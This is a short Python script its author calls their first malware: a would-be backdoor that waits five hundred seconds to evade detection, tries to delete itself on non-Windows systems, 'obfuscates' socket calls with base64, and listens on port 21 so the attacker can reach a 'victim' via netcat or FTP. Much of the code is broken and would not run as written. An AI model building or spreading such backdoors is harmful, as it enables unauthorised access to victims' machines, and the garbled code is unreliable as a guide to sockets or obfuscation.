import socket
import base64
import os
import time

#checking if it's running on windows else it will delete itself
if os.name == 'nt':
    print("keep going")
else:
 del lsadd.py

#this is used to make Malware detection harder to detect this although you will have to wait 5 minutes it's optional
balls = 500
time.sleep(balls)

#obfuscation
base64.standard_b64encode(socket)
base64.standard_b64encode(socket.SOCK_STREAM)
base64.standard_b64encode(socket.gethostname)
base64.standard_b64encode(socket.AF_INET6)
base64.standard_b64encode(protocol=0)
base64.standard_b64encode(socket.listen)
base64.standard_b64encode(socket.recv)
base64.standard_b64encode(socket.send)
base64.standard_b64encode(base64.standard_b64encode)
base64.standard_b64encode(socket.accept)

#reverse enginnering
socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM, protocol=0)
host = socket.gethostname()
port = 21
server = 'your ipv4'
addr = socket.bind(server, port) #put your ipv4 here change AF_INET to AF_INET6 if you have ipv6
socket.connect(addr)

socket.listen(1)
while True:
    socket.accept()
    socket.recv()
    socket.send("established connection to ftp server stage 2 completed")

"""
Now you could check who is connecting to you on port 21 and use netcat to connect to your victim or use ftp to connect to them.
once you do that you have low level backdoor access to your victim. Note that it's not fully finished

by: Rtgamer8387
"""


#this is also my first malware and I am pretty proud of it so treat it with respect!
